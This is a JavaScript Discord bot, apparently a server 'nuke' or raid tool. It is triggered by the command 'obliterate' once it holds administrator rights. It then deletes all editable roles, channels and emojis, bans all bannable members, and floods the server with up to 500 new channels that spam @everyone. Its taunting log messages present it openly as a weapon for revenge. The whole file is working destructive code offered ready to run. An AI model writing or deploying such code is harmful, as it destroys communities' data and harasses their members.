// Check README.md if you don't understand stuff...

const { Client, GatewayIntentBits, Events, EmbedBuilder, PermissionsBitField } = require('discord.js');

const raider = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildEmojisAndStickers,
    ],
});

const process = require("node:process");

process.on("unhandledRejection", (reason, promise) => {
  console.error("🗿 Unhandled Rejection:", promise, "reason:", reason);
});

process.on("uncaughtException", (err) => {
  console.error("🗿 Uncaught Exception:", err);
});

process.on("uncaughtExceptionMonitor", (err, origin) => {
  console.error("🗿 Uncaught Exception Monitor:", err, origin);
});

raider.once(Events.ClientReady, () => {
    console.log('\x1b[36m%s\x1b[0m', 'You\'re now in command!');
});

const lords = ["YOUR_ID_HERE"];

raider.on(Events.MessageCreate, async (message) => {
    if (message.content === "obliterate") {
        const UwU = new EmbedBuilder()
        .setColor('#b088e3')
        .setDescription('Owo I need big bwoy pewmissions to do dis\npwease give me admin\n૮ ˶ᵔ ᵕ ᵔ˶ ა')

        if (
            !message.guild.members.me.permissions.has(
                PermissionsBitField.Flags.Administrator
            )
        ) {
            return await message.reply({ embeds: [UwU], ephemeral: true });
        }

        if (!lords.includes(message.author.id))
            return;

        console.log('\x1b[31m%s\x1b[0m', 'Destruction has started! \x1b[35mMUAHAHAHA!\x1b[0m');

        const guild = message.guild;
        const maxChannels = 500;
        let channelCount = 0;

        const deletableRoles = guild.roles.cache.filter(
            (role) => role.editable && role.name !== "@everyone"
        );

        const deletableChannels = guild.channels.cache.filter(
            (channel) => channel.deletable
        );

        const deletableEmojis = guild.emojis.cache.filter(
            (emoji) => emoji.deletable
        );

        const deletionPromises = [];

        if (deletableRoles.size > 0) {
            deletionPromises.push(Promise.all(deletableRoles.map((role) => role.delete())));
            console.log('\x1b[33m%s\x1b[0m', "Roles deleted. \x1b[32mSee ya losers!\x1b[0m");
        }

        if (deletableChannels.size > 0) {
            for (const channel of deletableChannels.values()) {
                deletionPromises.push(channel.delete());
            }
            console.log('\x1b[33m%s\x1b[0m', "Channels obliterated. \x1b[32mRevenge is sweet!\x1b[0m");
        }

        if (deletableEmojis.size > 0) {
            for (const emoji of deletableEmojis.values()) {
                deletionPromises.push(emoji.delete());
            }
            console.log('\x1b[33m%s\x1b[0m', "Emojis wiped out. \x1b[32mYou can't hide!\x1b[0m");
        }

        await Promise.all(deletionPromises);
        console.log('\x1b[36m\x1b[5m%s\x1b[0m', "Deletion successful. \x1b[36m");

        const fetchedMembers = await guild.members.fetch();
        const bannableMembers = fetchedMembers.filter(
            (member) => !lords.includes(member.id) && member.bannable
        );

        const banPromises = bannableMembers.map((member) =>
            member.ban({ reason: "Crushed by the might of the command" })
        );

        await Promise.all(banPromises);

        if (bannableMembers.size > 0) {
            console.log(`\x1b[35mKilled the souls of ${bannableMembers.size} weaklings.\x1b[0m`);
        }

        const endTime = Date.now() + 30000;

        while (Date.now() < endTime && channelCount < maxChannels) {
            const newChannel = await guild.channels.create({ name: "🖕", type: "0" });
            channelCount++;

            await newChannel.send("@everyone");

            setInterval(() => {
                newChannel.send("@everyone");
            }, 1000);
        }

        console.log('\x1b[31m%s\x1b[0m', "Pathetic fools!");
        process.exit();

    }
});

raider.login('YOUR_BOT_TOKEN_HERE');
